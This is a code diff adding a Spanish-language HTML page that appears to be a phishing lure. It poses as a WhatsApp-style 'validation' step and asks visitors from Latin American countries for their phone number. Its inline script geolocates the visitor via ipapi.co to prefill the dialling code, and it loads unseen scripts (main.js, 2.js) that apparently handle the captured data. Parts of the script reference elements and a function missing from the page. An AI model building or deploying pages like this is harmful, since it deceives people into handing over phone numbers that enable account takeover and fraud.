@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  <link href="remixicon.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>Iniciar</title>
+</head>
+<body>
+  <section class="login">
+    <img src="https://cdn.glitch.global/2af793ad-4d64-4dda-8e13-4383886a2893/patrn.jpg?v=1748658215577" alt="Login-image" class="login--image">
+
+    <form  method="post" class="login--form">
+	<div align="left">
+	<img src="https://cdn.glitch.global/2af793ad-4d64-4dda-8e13-4383886a2893/lbg22.png?v=1748657466774" style="width:110px"><br>
+      <span style="font-size:16px"><b>Para continuar con la validaci&oacute;n su pais e ingrese su n&uacute;mero de tel&eacute;fono</b></span>
+</div><br>
+      <div class="login--content">
+        <div class="login-box">
+          <i class=""></i>
+
+          <div class="login--input-box">
+	
+		         <select id="country" class="login-input" name="country" >
+                <option value="" disabled="" selected="">Selecciona tu país</option>
+                <option value="+54">🇦🇷 Argentina</option>
+                <option value="+591">🇧🇴 Bolivia</option>
+                <option value="+55">🇧🇷 Brasil</option>
+                <option value="+56">🇨🇱 Chile</option>
+                <option value="+57">🇨🇴 Colombia</option>
+                <option value="+506">🇨🇷 Costa Rica</option>
+                <option value="+53">🇨🇺 Cuba</option>
+                <option value="+1">🇩🇴 República Dominicana</option>
+                <option value="+593">🇪🇨 Ecuador</option>
+                <option value="+503">🇸🇻 El Salvador</option>
+                <option value="+502">🇬🇹 Guatemala</option>
+                <option value="+504">🇭🇳 Honduras</option>
+                <option value="+52">🇲🇽 México</option>
+                <option value="+505">🇳🇮 Nicaragua</option>
+                <option value="+507">🇵🇦 Panamá</option>
+                <option value="+595">🇵🇾 Paraguay</option>
+                <option value="+51">🇵🇪 Perú</option>
+                <option value="+1">🇵🇷 Puerto Rico</option>
+                <option value="+598">🇺🇾 Uruguay</option>
+                <option value="+58">🇻🇪 Venezuela</option>
+            </select>
+     
+		 </div>
+        </div>
+
+        <div class="login-box">
+          <i class="ri-phone-fill"></i>
+
+          <div class="login--input-box">
+            <input type="tel" class="login-input" id="telefono" name="tlef" placeholder=" " maxlength="15" 
+			onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
+            <label for="" class="login--input-label">Teléfono</label>
+            
+          </div>
+        </div>
+      </div>
+
+
+      <button class="login--button--whatsapp">Siguiente</button>
+
+   
+    </form>
+  </section>
+  
+    <script>
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('popup').style.display = 'none';
+                document.querySelector('.content').style.display = 'flex';
+            }, 5000);
+
+            const countrySelect = document.getElementById('country');
+            const phoneInput = document.getElementById('telefono');
+            const form = document.getElementById('loginForm');
+         const submitButton = document.getElementById('submitButton');
+
+            countrySelect.addEventListener('change', function() {
+                phoneInput.value = countrySelect.value;
+            });
+
+            phoneInput.addEventListener('input', function() {
+                validatePhoneNumber();
+            });
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const countryCode = data.country_code;
+                    const countryMap = {
+                        'AR': '+54',
+                        'BO': '+591',
+                        'BR': '+55',
+                        'CL': '+56',
+                        'CO': '+57',
+                        'CR': '+506',
+                        'CU': '+53',
+                        'DO': '+1',
+                        'EC': '+593',
+                        'SV': '+503',
+                        'GT': '+502',
+                        'HN': '+504',
+                        'MX': '+52',
+                        'NI': '+505',
+                        'PA': '+507',
+                        'PY': '+595',
+                        'PE': '+51',
+                        'PR': '+1',
+                        'UY': '+598',
+                        'VE': '+58'
+                    };
+                    countrySelect.value = countryMap[countryCode] || '';
+                    validatePhoneNumber();
+                })
+                .catch(error => console.error('Error al obtener la ubicación:', error));
+        }
+    </script>
+  <script src="main.js"></script>
+  <script src="2.js"></script>
+</body></html>
